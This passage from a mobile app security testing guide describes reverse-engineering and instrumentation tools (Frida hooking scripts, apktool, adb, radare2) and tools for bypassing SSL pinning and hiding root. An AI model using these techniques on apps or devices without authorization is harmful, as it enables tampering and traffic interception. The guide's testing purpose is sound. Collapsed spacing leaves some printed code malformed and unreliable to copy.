android.process.media 198 bridgemgrd 30692 com.android.chrome 30774 com.android.chrome:privileged_process0 30747 com.android.chrome:sandboxed 30834 com.android.chrome:sandboxed 3059 com.android.nfc 1526 com.android.phone 17104 com.android.settings 1302 com.android.systemui (...) Orrestrictthelistwiththe-Uaiflagcombinationtogetallapps(-a)currentlyinstalled(-i)ontheconnectedUSBdevice (-U): $frida-ps -Uai PID Name Identifier ----- ---------------------------------------- ------------------------------ 766 AndroidSystem android 30692 Chrome com.android.chrome 3520 ContactsStorage com.android.providers.contacts - Uncrackable1 sg.vantagepoint.uncrackable1 - drozerAgent com.mwr.dz Thiswillshowthenamesandidentifiersofallapps,iftheyarecurrentlyrunningitwillalsoshowtheirPIDs. Searchfor yourappinthelistandtakeanoteofthePIDoritsname/identifier. Fromnowonyou’llrefertoyourappbyusingoneof them. Arecommendationistousetheidentifiers,asthePIDswillchangeoneachrunoftheapp. Forexamplelet’stake com.android.chrome. YoucanusethisstringnowonallFridatools,e.g.ontheFridaCLI,onfrida-traceorfromaPython script. Tracing Native Libraries with frida-trace Totracespecific(low-level)librarycalls,youcanusethefrida-tracecommandlinetool: frida-trace -Ucom.android.chrome -i"open" This generates a little JavaScript in __handlers__/libc.so/open.js, which Frida injects into the process. The script tracesallcallstotheopenfunctioninlibc.so. YoucanmodifythegeneratedscriptaccordingtoyourneedswithFrida JavaScriptAPI. Unfortunatelytracinghigh-levelmethodsofJavaclassesisnotyetsupported(butmightbeinthefuture). Frida CLI and the Java API Use the Frida CLI tool (frida) to work with Frida interactively. It hooks into a process and gives you a command line interfacetoFrida’sAPI. frida -Ucom.android.chrome Withthe-loption,youcanalsousetheFridaCLItoloadscripts,e.g.,toloadmyscript.js: 530\nfrida -U-lmyscript.jscom.android.chrome FridaalsoprovidesaJavaAPI,whichisespeciallyhelpfulfordealingwithAndroidapps. ItletsyouworkwithJavaclasses andobjectsdirectly. HereisascripttooverwritetheonResumefunctionofanActivityclass: Java.perform(function (){ varActivity =Java.use("android.app.Activity"); Activity.onResume.implementation =function (){ console.log("[*]onResume()gotcalled!"); this.onResume(); }; }); TheabovescriptcallsJava.performtomakesurethatyourcodegetsexecutedinthecontextoftheJavaVM.Itinstantiates awrapperfortheandroid.app.ActivityclassviaJava.useandoverwritestheonResumefunction. ThenewonResume functionimplementationprintsanoticetotheconsoleandcallstheoriginalonResumemethodbyinvokingthis.onResume everytimeanactivityisresumedintheapp. The JADX decompiler (v1.3.3 and above) can generate Frida snippets through its graphical code browser. To use this feature,opentheAPKorDEXwithjadx-gui,browsetothetargetmethod,rightclickthemethodname,andselect“Copy asfridasnippet(f)”. ForexampleusingtheMASTGUnCrackableAppforAndroidLevel1: Theabovestepsplacethefollowingoutputinthepasteboard,whichyoucanthenpasteinaJavaScriptfileandfeedinto frida -U -l. leta=Java.use("sg.vantagepoint.a.a"); a["a"].implementation =function (bArr,bArr2){ console.log('aiscalled' +',' +'bArr:' +bArr +',' +'bArr2:' +bArr2); letret=this.a(bArr,bArr2); console.log('aretvalueis' +ret); return ret; }; The above code hooks the a method within the sg.vantagepoint.a.a class and logs its input parameters and return values. 531\nFridaalsoletsyousearchforandworkwithinstantiatedobjectsthatareontheheap. Thefollowingscriptsearchesfor instancesofandroid.view.ViewobjectsandcallstheirtoStringmethod. Theresultisprintedtotheconsole: setImmediate(function(){ console.log("[*]Startingscript"); Java.perform(function (){ Java.choose("android.view.View",{ "onMatch":function(instance){ console.log("[*]Instancefound:" +instance.toString()); }, "onComplete":function(){ console.log("[*]Finishedheapsearch") } }); }); }); Theoutputwouldlooklikethis: [*]Startingscript [*]Instancefound:android.view.View{7ccea78G.ED...........ID0,0-0,0 #7f0c01fcapp:id/action_bar_black_background} [*]Instancefound:android.view.View{2809551V.ED.............0,1731-0,1731 #7f0c01ffapp:id/menu_anchor_stub} [*]Instancefound:android.view.View{be471b6G.ED...........I.0,0-0,0 #7f0c01f5app:id/location_bar_verbose_status_separator} [*]Instancefound:android.view.View{3ae0eb7V.ED.............0,0-1080,63 #102002fandroid:id/statusBarBackground} [*]Finishedheapsearch YoucanalsouseJava’sreflectioncapabilities. Tolistthepublicmethodsoftheandroid.view.Viewclass,youcouldcreate awrapperforthisclassinFridaandcallgetMethodsfromthewrapper’sclassproperty: Java.perform(function (){ varview =Java.use("android.view.View"); varmethods =view.class.getMethods(); for(vari=0;i<methods.length;i++){ console.log(methods[i].toString()); } }); Thiswillprintaverylonglistofmethodstotheterminal: public boolean android.view.View.canResolveLayoutDirection() public boolean android.view.View.canResolveTextAlignment() public boolean android.view.View.canResolveTextDirection() public boolean android.view.View.canScrollHorizontally(int) public boolean android.view.View.canScrollVertically(int) public final void android.view.View.cancelDragAndDrop() public void android.view.View.cancelLongPress() public final void android.view.View.cancelPendingInputEvents() ... Apktool Platform: android Availableat: https://github.com/iBotPeaches/Apktool Apktool is used to unpack Android app packages (APKs). Simply unzipping APKs with the standardunzip utility leaves somefilesunreadable. AndroidManifest.xmlisencodedintobinaryXMLformatwhichisn’treadablewithatexteditor. Also,theappresourcesarestillpackagedintoasinglearchivefile. When run with default command line flags, apktool automatically decodes the Android Manifest file to text-based XML formatandextractsthefileresources(italsodisassemblesthe.DEXfilestosmalicode-afeaturethatwe’llrevisitlater inthisbook). Amongtheunpackedfilesyoucanusuallyfind(afterrunningapktool d base.apk): • AndroidManifest.xml: ThedecodedAndroidManifestfile,whichcanbeopenedandeditedinatexteditor. • apktool.yml: filecontaininginformationabouttheoutputofapktool • original: foldercontainingtheMANIFEST.MFfile,whichcontainsinformationaboutthefilescontainedintheJARfile • res: directorycontainingtheapp’sresources 532\n• smali: directorycontainingthedisassembledDalvikbytecode. You can also use apktool to repackage decoded resources back to binary APK/JAR. See the section “Exploring the App Package”lateronthischapterandsection“Repackaging”inthechapterTamperingandReverseEngineeringonAndroid formoreinformationandpracticalexamples. Termux Platform: android TermuxisaterminalemulatorforAndroidthatprovidesaLinuxenvironmentthatworksdirectlywithorwithoutrooting andwithnosetuprequired. TheinstallationofadditionalpackagesisatrivialtaskthankstoitsownAPTpackagemanager (whichmakesadifferenceincomparisontootherterminalemulatorapps). Youcansearchforspecificpackagesbyusing thecommandpkgsearch<pkg_name>andinstallpackageswithpkginstall<pkg_name>. YoucaninstallTermuxstraight fromGooglePlay. adb Platform: android adb(AndroidDebugBridge),shippedwiththeAndroidSDK,bridgesthegapbetweenyourlocaldevelopmentenvironment andaconnectedAndroiddevice. You’llusuallyleverageittotestappsontheemulatororaconnecteddeviceviaUSBor Wi-Fi. Usetheadb devicescommandtolisttheconnecteddevicesandexecuteitwiththe-largumenttoretrievemore detailsonthem. $adbdevices -l Listofdevicesattached 090c285c0b97f748deviceusb:1-1product:razormodel:Nexus_7device:flo emulator-5554 deviceproduct:sdk_google_phone_x86model:Android_SDK_built_for_x86device:generic_x86transport_id:1 adb provides other useful commands such as adb shell to start an interactive shell on a target and adb forward to forwardtrafficonaspecifichostporttoadifferentportonaconnectdevice. adbforwardtcp:<hostport>tcp:<deviceport> $adb -semulator-5554shell root@generic_x86:/ #ls acct cache charger config ... You’llcomeacrossdifferentusecasesonhowyoucanuseadbcommandswhentestinglaterinthisbook. Notethatyou mustdefinetheserialnummerofthetargetdevicewiththe-sargument(asshownbythepreviouscodesnippet)incase youhavemultipledevicesconnected. SSLUnpinning Platform: android Availableat: https://github.com/ac-pm/SSLUnpinning_Xposed AnXposedModuletobypassSSLcertificatepinning-https://github.com/ac-pm/SSLUnpinning_Xposed apkx 533\nPlatform: android Availableat: https://github.com/muellerberndt/apkx apkxisaPythonwrappertopopularfreeDEXconvertersandJavadecompilers. Itautomatestheextraction,conversion, anddecompilationofAPKs. Installitasfollows: gitclonehttps://github.com/muellerberndt/apkx cdapkx sudo ./install.sh Thisshouldcopyapkxto/usr/local/bin. Seesection“DecompilingJavaCode”ofthe“ReverseEngineeringandTam- pering”chapterformoreinformationaboutusage. RootCloak Plus Platform: android Availableat: https://github.com/devadvance/rootcloakplus ACydiaSubstrateModuleusedtocheckforcommonlyknownindicationsofroot-https://github.com/devadvance/rootcl oakplus Angr Platform: android AngrisaPythonframeworkforanalyzingbinaries. Itisusefulforbothstaticanddynamicsymbolic(“concolic”)analysis. Inotherwords: givenabinaryandarequestedstate,Angrwilltrytogettothatstate,usingformalmethods(atechnique used for static code analysis) to find a path, as well as brute forcing. Using angr to get to the requestedstate is often muchfasterthantakingmanualstepsfordebuggingandsearchingthepathtowardstherequiredstate. Angroperates ontheVEXintermediatelanguageandcomeswithaloaderforELF/ARMbinaries,soitisperfectfordealingwithnative code,suchasnativeAndroidbinaries. Angrallowsfordisassembly,programinstrumentation,symbolicexecution,control-flowanalysis,data-dependencyanal- ysis,decompilationandmore,givenalargesetofplugins. Since version 8, Angr is based on Python 3, and can be installed with pip on *nix operating systems, macOS and Win- dows: pipinstallangr Someofangr’sdependenciescontainforkedversionsofthePythonmodulesZ3andPyVEX,whichwouldoverwrite theoriginalversions. Ifyou’reusingthosemodulesforanythingelse,youshouldcreateadedicatedvirtualenviron- mentwithVirtualenv. Alternatively,youcanalwaysusetheprovideddockercontainer. Seetheinstallationguide formoredetails. Comprehensive documentation, including an installation guide, tutorials, and usage examples are available on Angr’s Gitbookspage. AcompleteAPIreferenceisalsoavailable. YoucanuseangrfromaPythonREPL-suchasiPython-orscriptyourapproaches. Althoughangrhasabitofasteep learningcurve,wedorecommendusingitwhenyouwanttobruteforceyourwaytoagivenstateofanexecutable. Please seethe “SymbolicExecution” sectionof the “ReverseEngineering and Tampering”chapter as a greatexampleon how thiscanwork. Magisk 534\nPlatform: android Magisk (“Magic Mask”) is one way to root your Android device. It’s specialty lies in the way the modifications on the systemareperformed. Whileotherrootingtoolsaltertheactualdataonthesystempartition,Magiskdoesnot(whichis called“systemless”). Thisenablesa waytohidethemodificationsfromroot-sensitiveapplications (e.g.forbankingor games)andallowsusingtheofficialAndroidOTAupgradeswithouttheneedtounrootthedevicebeforehand. YoucangetfamiliarwithMagiskreadingtheofficialdocumentationonGitHub. Ifyoudon’thaveMagiskinstalled,youcan findinstallationinstructionsinthedocumentation. IfyouuseanofficialAndroidversionandplantoupgradeit,Magisk providesatutorialonGitHub. LearnmoreaboutrootingyourdevicewithMagisk. FlowDroid Platform: android Availableat: https://github.com/secure-software-engineering/FlowDroid FlowDroid is an open-source tool based in soot, a framework dedicated to analyzing and translating Java bytecode for easier analysis. The tool handles the nuances of Android app lifecycles (like onCreate, onStart, onPause, and others) anditsUIcomponentsduringanalysisandperformstaintanalysisthatis: • Context-sensitive: Distinguishingbetweencallstothesamemethodbasedontheirspecificexecutioncontexts. • Object-sensitive: Identifyingindividualobjects,evenwhenthey’reofthesameclass. • Flow-sensitive: Recognizingthesequentialorderofcodeexecution. FlowDroidcanbeusedintwoways: asastandalonecommandlinetoolforquickanalysesorasalibraryformorecomplex investigations. Inadditiontoperformingtaintanalysis,FlowDroidcanalsogeneratecallgraphs,asillustratedinthisblog post. jdb Platform: android A Java Debugger which allows to set breakpoints and print application variables. jdb uses the JDWP protocol - https: //docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html APKLab Platform: android Availableat: https://github.com/APKLab/APKLab APKLabisaconvenientVisualStudioCodeextensionleveragingtoolssuchasapktoolandjadxtoenablefeaturesincluding appunpacking,decompilation,codepatching(e.g.forMITM),andrepackagingstraightfromtheIDE. Formoreinformation,youcanrefertoAPKLab’sofficialdocumentation. Busybox Platform: android Busybox combines multiple common Unix utilities into a small single executable. The utilities included generally have feweroptionsthantheirfull-featuredGNUcounterparts,butaresufficientenoughtoprovideacompleteenvironmenton asmallorembeddedsystem. BusyboxcanbeinstalledonarooteddevicebydownloadingtheBusyboxapplicationfrom GooglePlayStore. YoucanalsodownloadthebinarydirectlyfromtheBusyboxwebsite. Oncedownloaded,makeanadb push busybox /data/local/tmptohavetheexecutableavailableonyourphone. Aquickoverviewofhowtoinstalland useBusyboxcanbefoundintheBusyboxFAQ. 535\nProguard Platform: android ProGuardisafreeJavaclassfileshrinker,optimizer,obfuscator,andpreverifier. Itdetectsandremovesunusedclasses, fields,methods,andattributesandcanalsobeusedtodeletelogging-relatedcode. MobSF for Android Platform: android Availableat: https://github.com/MobSF/Mobile-Security-Framework-MobSF AfterMobSFisdonewithitsanalysis,youwillreceiveaone-pageoverviewofalltheteststhatwereexecuted. Thepage issplitupintomultiplesectionsgivingsomefirsthintsontheattacksurfaceoftheapplication. Thefollowingisdisplayed: • Basicinformationabouttheappanditsbinaryfile. • Someoptionsto: – ViewtheAndroidManifest.xmlfile. – ViewtheIPCcomponentsoftheapp. • Signercertificate. • Apppermissions. • Asecurityanalysisshowingknowndefectse.g.iftheappbackupsareenabled. • ListoflibrariesusedbytheappbinaryandlistofallfilesinsidetheunzippedAPK. • MalwareanalysisthatchecksformaliciousURLs. RefertoMobSFdocumentationformoredetails. Bytecode Viewer Platform: android Bytecode Viewer (BCV) is a free and open source Java decompiler framework running on all operating systems. It is a versatiletoolwhichcanbeusedtodecompileAndroidapps, viewAPKresources(viaapktool)andeasilyeditAPKs(via Smali/Baksmali). Apart from APKs, also DEX, Java Class files and Java Jars can be viewed. One of its major features is 536\nthesupportformultipleJavabytecodedecompilersunderoneGUI.BCVcurrentlyincludestheProcyon,CFR,Fernflower, Krakatau, and JADX-Core decompilers. These decompilers have different strengths and can be easily leveraged while usingBCV,especiallywhendealingwithobfuscatedprograms. radare2 for Android Platform: android Availableat: https://github.com/radare/radare2 radare2 (r2) is a popular open source reverse engineering framework for disassembling, debugging, patching and ana- lyzingbinaries that isscriptable and supports manyarchitecturesand file formatsincluding Androidand iOS apps. For Android, DalvikDEX(odex, multidex), ELF(executables, .so, ART)andJava(JNIandJavaclasses)aresupported. Italso containsseveralusefulscriptsthatcanhelpyouduringmobileapplicationanalysisasitofferslowleveldisassembling andsafestaticanalysisthatcomesinhandywhentraditionaltoolsfail. radare2implementsarichcommandlineinterface(CLI)whereyoucanperformthementionedtasks. However,ifyou’re notreallycomfortableusingtheCLIforreverseengineeringyoumaywanttoconsiderusingtheWebUI(viathe-Hflag) ortheevenmoreconvenientQtandC++GUIversioncallediaito. DokeepinmindthattheCLI,andmoreconcretelyits VisualModeanditsscriptingcapabilities(r2pipe),arethecoreofradare2’spowerandit’sdefinitelyworthlearninghow touseit. Installing radare2 Pleaserefertoradare2’sofficialinstallationinstructions. Wehighlyrecommendtoalwaysinstallradare2fromtheGitHub versioninsteadofviacommonpackagemanagerssuchasAPT.Radare2isinveryactivedevelopment,whichmeansthat thirdpartyrepositoriesareoftenoutdated. Using radare2 Theradare2frameworkcomprisesasetofsmallutilitiesthatcanbeusedfromther2shellorindependentlyasCLItools. Theseutilitiesincluderabin2,rasm2,rahash2,radiff2,rafind2,ragg2,rarun2,rax2,andofcourser2,whichisthe mainone. Forexample,youcanuserafind2toreadstringsdirectlyfromanencodedAndroidManifest(AndroidManifest.xml): ##Permissions $rafind2 -ZSpermissionAndroidManifest.xml ##Activities $rafind2 -ZSactivityAndroidManifest.xml ##Contentproviders $rafind2 -ZSproviderAndroidManifest.xml ##Services $rafind2 -ZSserviceAndroidManifest.xml ##Receivers $rafind2 -ZSreceiverAndroidManifest.xml Oruserabin2togetinformationaboutabinaryfile: $rabin2 -IUnCrackable-Level1/classes.dex arch dalvik baddr 0x0 binsz 5528 bintype class bits 32 canary false retguardfalse class 035 crypto false endian little havecodetrue laddr 0x0 lang dalvik linenum false lsyms false 537\nmachine DalvikVM maxopsz 16 minopsz 1 nx false os linux pcalign 0 pic false relocs false sanitiz false static true strippedfalse subsys java va true sha1 12-5508c b7fafe72cb521450c4470043caa332da61d1bec7 adler32 12-5528c 00000000 Typerabin2 -htoseealloptions: $rabin2 -h Usage:rabin2 [-AcdeEghHiIjlLMqrRsSUvVxzZ][-@at][-aarch][-bbits][-Baddr] [-CF:C:D][-fstr][-maddr][-nstr][-Nm:M][-P[-P]pdb] [-ostr][-Ostr][-kquery][-Dlangsymname]file -@[addr] showsection,symbolorimportataddr -A listsub-binariesandtheirarch-bitspairs -a[arch] setarch (x86,arm,..or <arch>_<bits>) -b[bits] setbits (32,64...) -B[addr] overridebaseaddress (piebins) -c listclasses -cc listclassesinheaderformat -H headerfields -i imports (symbolsimportedfromlibraries) -I binaryinfo -j outputinjson ... Usethemainr2utilitytoaccessther2shell. YoucanloadDEXbinariesjustlikeanyotherbinary: r2classes.dex Enter r2 -h to see all available options. A very commonly used flag is -A, which triggers an analysis after loading the targetbinary. However,thisshouldbeusedsparinglyandwithsmallbinariesasitisverytimeandresourceconsuming. Youcanlearnmoreaboutthisinthechapter“TamperingandReverseEngineeringonAndroid”. Onceinther2shell,youcanalsoaccessfunctionsofferedbytheotherradare2utilities. Forexample,runningiwillprint theinformationofthebinary,exactlyasrabin2 -Idoes. Toprintallthestringsuserabin2 -Zorthecommandiz(orthelessverboseizq)fromther2shell. [0x000009c8]>izq 0xc503939/dev/com.koushikdutta.superuser.daemon/ 0xc792525/system/app/Superuser.apk ... 0xd2344445UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc= 0xd5132328d127684cbc37c17616d806cf50473cc 0xd7666 <init> 0xd831010AESerror: 0xd8f2020AES/ECB/PKCS7Padding 0xda51818Appisdebuggable! 0xdc099CodeCheck 0x11ac77Nope... 0x11bf1414Rootdetected! Mostofthetimeyoucanappendspecialoptionstoyourcommandssuchasqtomakethecommandlessverbose(quiet) orjtogivetheoutputinJSONformat(use~{}toprettifytheJSONstring). [0x000009c8]>izj~{} [ { "vaddr":3152, "paddr": 3152, "ordinal":1, "size":39, "length":39, "section":"file", "type":"ascii", "string":"L2Rldi9jb20ua291c2hpa2R1dHRhLnN1cGVydXNlci5kYWVtb24v" }, 538\n{ "vaddr":3193, "paddr":3193, "ordinal":2, "size":25, "length":25, "section":"file", "type":"ascii", "string":"L3N5c3RlbS9hcHAvU3VwZXJ1c2VyLmFwaw==" }, Youcanprinttheclassnamesandtheirmethodswithther2commandic(informationclasses). [0x000009c8]>ic ... 0x0000073c[0x00000958 -0x00000abc] 356class5Lsg/vantagepoint/uncrackable1/MainActivity ::Landroid/app/Activity; 0x00000958method0pC Lsg/vantagepoint/uncrackable1/MainActivity.method.<init>()V 0x00000970method1P Lsg/vantagepoint/uncrackable1/MainActivity.method.a(Ljava/lang/String;)V 0x000009c8method2r Lsg/vantagepoint/uncrackable1/MainActivity.method.onCreate (Landroid/os/Bundle;)V 0x00000a38method3p Lsg/vantagepoint/uncrackable1/MainActivity.method.verify (Landroid/view/View;)V 0x0000075c[0x00000acc -0x00000bb2] 230class6Lsg/vantagepoint/uncrackable1/a::Ljava/lang/Object; 0x00000accmethod0sp Lsg/vantagepoint/uncrackable1/a.method.a(Ljava/lang/String;)Z 0x00000b5cmethod1sp Lsg/vantagepoint/uncrackable1/a.method.b(Ljava/lang/String;)[B Youcanprinttheimportedmethodswithther2commandii(informationimports). [0x000009c8]>ii [Imports] Num Vaddr Bind TypeName ... 290x000005cc NONE FUNCLjava/lang/StringBuilder.method.append(Ljava/lang/String;)Ljava/lang/StringBuilder; 300x000005d4 NONE FUNCLjava/lang/StringBuilder.method.toString()Ljava/lang/String; 310x000005dc NONE FUNCLjava/lang/System.method.exit(I)V 320x000005e4 NONE FUNCLjava/lang/System.method.getenv(Ljava/lang/String;)Ljava/lang/String; 330x000005ec NONE FUNCLjavax/crypto/Cipher.method.doFinal([B)[B 340x000005f4 NONE FUNCLjavax/crypto/Cipher.method.getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher; 350x000005fc NONE FUNCLjavax/crypto/Cipher.method.init(ILjava/security/Key;)V 360x00000604 NONE FUNCLjavax/crypto/spec/SecretKeySpec.method.<init>([BLjava/lang/String;)V Acommonapproachwheninspectingabinaryistosearchforsomething,navigatetoitandvisualizeitinordertointerpret thecode. Oneofthewaystofindsomethingusingradare2isbyfilteringtheoutputofspecificcommands, i.e.togrep themusing~plusakeyword(~+forcase-insensitive). Forexample,wemightknowthattheappisverifyingsomething, wecaninspectallradare2flagsandseewherewefindsomethingrelatedto“verify”. Whenloadingafile, radare2tagseverythingit’sabletofind. Thesetaggednamesorreferencesarecalledflags. Youcanaccessthemviathecommandf. Inthiscasewewillgreptheflagsusingthekeyword“verify”: [0x000009c8]>f~+verify 0x00000a38132sym.Lsg_vantagepoint_uncrackable1_MainActivity.method. \ verify_Landroid_view_View__V 0x00000a38132method.public.Lsg_vantagepoint_uncrackable1_MainActivity. \ Lsg_vantagepoint_uncrackable1 _MainActivity.method.verify_Landroid_view_View__V 0x000014006str.verify Itseemsthatwe’vefoundonemethodin0x00000a38(thatwastaggedtwotimes)andonestringin0x00001400. Let’s navigate(seek)tothatmethodbyusingitsflag: [0x000009c8]>ssym.Lsg_vantagepoint_uncrackable1_MainActivity.method. \ verify_Landroid_view_View__V Andofcourseyoucanalsousethedisassemblercapabilitiesofr2andprintthedisassemblywiththecommandpd(or pdfifyouknowyou’realreadylocatedinafunction). [0x00000a38]>pd 539\nr2commandsnormallyacceptoptions(seepd?),e.g.youcanlimittheopcodesdisplayedbyappendinganumber(“N”) tothecommandpd N. Insteadofjustprintingthedisassemblytotheconsoleyoumaywanttoentertheso-calledVisualModebytypingV. By default, you will see the hexadecimal view. By typing p you can switch to different views, such as the disassembly view: Radare2offersaGraphModethatisveryusefultofollowtheflowofthecode. YoucanaccessitfromtheVisualMode bytypingV: 540\nThisisonlyaselectionofsomeradare2commandstostartgettingsomebasicinformationfromAndroidbinaries. Radare2 isverypowerfulandhasdozensofcommandsthatyoucanfindontheradare2commanddocumentation. Radare2will beusedthroughouttheguidefordifferentpurposessuchasreversingcode,debuggingorperformingbinaryanalysis. We willalsouseitincombinationwithotherframeworks,especiallyFrida(seether2fridasectionformoreinformation). Pleaserefertothechapter“TamperingandReverseEngineeringonAndroid”formoredetaileduseofradare2onAndroid, especiallywhenanalyzingnativelibraries. Youmayalsowanttoreadtheofficialradare2book. Android NDK Platform: android TheAndroidNDKcontainsprebuiltversionsofthenativecompilerandtoolchain. BoththeGCCandClangcompilershave traditionallybeensupported,butactivesupportforGCCendedwithNDKrevision14. Thedevicearchitectureandhost OSdeterminetheappropriateversion. TheprebuilttoolchainsareinthetoolchainsdirectoryoftheNDK,whichcontains onesubdirectoryforeacharchitecture. Architecture Toolchainname ARM-based arm-linux-androideabi-<gcc-version> x86-based x86-<gcc-version> MIPS-based mipsel-linux-android-<gcc-version> ARM64-based aarch64-linux-android-<gcc-version> X86-64-based x86_64-<gcc-version> MIPS64-based mips64el-linux-android-<gcc-version> Besidespickingtherightarchitecture,youneedtospecifythecorrectsysrootforthenativeAPIlevelyouwanttotarget. Thesysrootisadirectorythatcontainsthesystemheadersandlibrariesforyourtarget. NativeAPIsvarybyAndroidAPI 541\nlevel. AvailablesysrootdirectoriesforeachAndroidAPIlevelcanbefoundin$NDK/platforms/. EachAPIleveldirectory containssubdirectoriesforthevariousCPUsandarchitectures. Onepossibilityforsettingupthebuildsystemisexportingthecompilerpathandnecessaryflagsasenvironmentvariables. To make things easier, however, the NDK allows you to create a so-called standalone toolchain, which is a temporary toolchainthatincorporatestherequiredsettings. Tosetupastandalonetoolchain,downloadthelateststableversionoftheNDK.ExtracttheZIPfile,changeintotheNDK rootdirectory,andrunthefollowingcommand: ./build/tools/make_standalone_toolchain.py --arch arm--api 24--install-dir /tmp/android-7-toolchain ThiscreatesastandalonetoolchainforAndroid7.0(APIlevel24)inthedirectory/tmp/android-7-toolchain. Forcon- venience, you can export an environment variable that points to your toolchain directory, (we’ll be using this in the examples). Runthefollowingcommandoraddittoyour.bash_profileorotherstartupscript: export TOOLCHAIN=/tmp/android-7-toolchain jadx Platform: android Availableat: https://github.com/skylot/jadx jadx(DextoJavaDecompiler)isacommandlineandGUItoolforproducingJavasourcecodefromAndroidDEXandAPK files-https://github.com/skylot/jadx nm - Android Platform: android nm is a tool that displays the name list (symbol table) of the given binary. You can find here more information for the Android(GNU)version. Android-SSL-TrustKiller Platform: android Availableat: https://github.com/iSECPartners/Android-SSL-TrustKiller Android-SSL-TrustKillerisaCydiaSubstrateModuleactingasablackboxtooltobypassSSLcertificatepinningformost applicationsrunningonadevice-https://github.com/iSECPartners/Android-SSL-TrustKiller House Platform: android Availableat: https://github.com/nccgroup/house HouseisaruntimemobileapplicationanalysistoolkitforAndroidapps,developedandmaintainedbytheNCCGroupand iswritteninPython. It’sleveragingarunningFridaserveronarooteddeviceortheFridagadgetinarepackagedAndroidapp. Theintention ofHouseistoallowaneasywayofprototypingFridascriptsviaitsconvenientwebGUI. Theinstallationinstructionsand“how-toguide”ofHousecanbefoundintheReadmeoftheGithubrepo. 542\nAndroid SDK Platform: android Local Android SDK installations are managed via Android Studio. Create an empty project in Android Studio and select Tools->SDK ManagertoopentheSDKManagerGUI.TheSDK PlatformstabiswhereyouinstallSDKsformultiple APIlevels. RecentAPIlevelsare: • Android11.0(APIlevel30) • Android10.0(APIlevel29) • Android9.0(APIlevel28) • Android8.1(APIlevel27) • Android8.0(APIlevel26) AnoverviewofallAndroidcodenames,theirversionnumberandAPIlevelscanbefoundintheAndroidDeveloperDocu- mentation. InstalledSDKsareonthefollowingpaths: Windows: C:\Users\<username>\AppData\Local\Android\sdk MacOS: /Users/<username>/Library/Android/sdk Note: OnLinux,youneedtochooseanSDKdirectory. /opt,/srv,and/usr/localarecommonchoices. 543\nsimctl Platform: ios simctlisanXcodetoolthatallowsyoutointeractwithiOSsimulatorsviathecommandlinetoe.g.managesimulators, launchapps,takescreenshotsorcollecttheirlogs. lldb Platform: ios Availableat: https://lldb.llvm.org/ AdebuggerbyApple’sXcodeusedfordebuggingiOSapplications-https://lldb.llvm.org/ Xcode Command Line Tools Platform: ios Availableat: https://developer.apple.com/download/more/ AfterinstallingXcode,inordertomakealldevelopmenttoolsavailablesystemwide,itisrecommendedtoinstalltheXcode CommandLineToolspackage. ThiswillbehandyduringtestingofiOSappsassomeofthetools(e.g.objection)arealso relyingontheavailabilityofthispackage. YoucandownloaditfromtheofficialApplewebsiteorinstallitstraightaway fromyourterminal: xcode-select --install class-dump-dyld Platform: ios Availableat: https://github.com/limneos/classdump-dyld class-dump-dyldbyEliasLimneosallowssymbolstobedumpedandretrieveddirectlyfromthesharedcache,eliminating thenecessityofextractingthefilesfirst. Itcangenerateheaderfilesfromappbinaries,libraries,frameworks,bundles, orthewholedyld_shared_cache. Directoriesortheentiretyofdyld_shared_cachecanberecursivelymass-dumped. Frida for iOS Platform: ios Availableat: https://github.com/frida/frida FridasupportsinteractionwiththeObjective-CruntimethroughtheObjCAPI.You’llbeabletohookandcallbothObjective- C and native functions inside the process and its native libraries. Your JavaScript snippets have full access to memory, e.g.toreadand/orwriteanystructureddata. HerearesometasksthatFridaAPIsoffersandarerelevantorexclusiveoniOS: • InstantiateObjective-Cobjectsandcallstaticandnon-staticclassmethods(ObjCAPI). • TraceObjective-Cmethodcallsand/orreplacetheirimplementations(InterceptorAPI). • Enumerateliveinstancesofspecificclassesbyscanningtheheap(ObjCAPI). • Scanprocessmemoryforoccurrencesofastring(MemoryAPI). • Interceptnativefunctioncallstorunyourowncodeatfunctionentryandexit(InterceptorAPI). 544\nRememberthatoniOS,youcanalsobenefitfromthebuilt-intoolsprovidedwheninstallingFrida,whichincludetheFrida CLI(frida),frida-ps,frida-ls-devicesandfrida-trace,tonameafew. There’safrida-tracefeatureexclusiveoniOSworthhighlighting: tracingObjective-CAPIsusingthe-mflagandwild- cards. Forexample, tracingallmethodsincluding“HTTP”intheirnameandbelongingtoanyclasswhosenamestarts with“NSURL”isaseasyasrunning: frida-trace -UYourApp -m"*[NSURL**HTTP*]" ForaquickstartyoucangothroughtheiOSexamples. Installing Frida on iOS ToconnectFridatoaniOSapp,youneedawaytoinjecttheFridaruntimeintothatapp. Thisiseasytodoonajailbroken device: justinstallfrida-serverthroughCydia. Onceithasbeeninstalled,theFridaserverwillautomaticallyrunwith rootprivileges,allowingyoutoeasilyinjectcodeintoanyprocess. StartCydiaandaddFrida’srepositorybynavigatingtoManage->Sources->Edit->Addandenteringhttps://build.fr ida.re. YoushouldthenbeabletofindandinstalltheFridapackage. Using Frida on iOS ConnectyourdeviceviaUSBandmakesurethatFridaworksbyrunningthefrida-pscommandandtheflag‘-U’.This shouldreturnthelistofprocessesrunningonthedevice: $frida-ps -U PID Name --- ---------------- 963 Mail 952 Safari 416 BTServer 422 BlueTool 791 CalendarWidget 451 CloudKeychainPro 239 CommCenter 764 ContactsCoreSpot (...) Frida Bindings Inordertoextendthescriptingexperience,FridaoffersbindingstoprogramminglanguagessuchasPython,C,NodeJS, andSwift. TakingPythonasanexample,thefirstthingtonoteisthatnofurtherinstallationstepsarerequired. StartyourPython scriptwithimport fridaandyou’rereadytogo. SeethefollowingscriptthatsimplyrunsthepreviousJavaScriptsnip- pet: ##frida_python.py importfrida session =frida.get_usb_device().attach('com.android.chrome') source =""" Java.perform(function(){ varview=Java.use("android.view.View"); varmethods=view.class.getMethods(); for(vari=0;i<methods.length;i++){ console.log(methods[i].toString()); } }); """ script =session.create_script(source) script.load() session.detach() 545\nInthiscase,runningthePythonscript(python3 frida_python.py)hasthesameresultasthepreviousexample: itwill printallmethodsoftheandroid.view.Viewclasstotheterminal. However,youmightwanttoworkwiththatdatafrom Python. Using send instead of console.log will send data in JSON format from JavaScript to Python. Please read the commentsintheexamplebelow: ##python3frida_python_send.py importfrida session =frida.get_usb_device().attach('com.android.chrome') ##1.wewanttostoremethodnamesinsidealist android_view_methods =[] source =""" Java.perform(function(){ varview=Java.use("android.view.View"); varmethods=view.class.getMethods(); for(vari=0;i<methods.length;i++){ send(methods[i].toString()); } }); """ script =session.create_script(source) 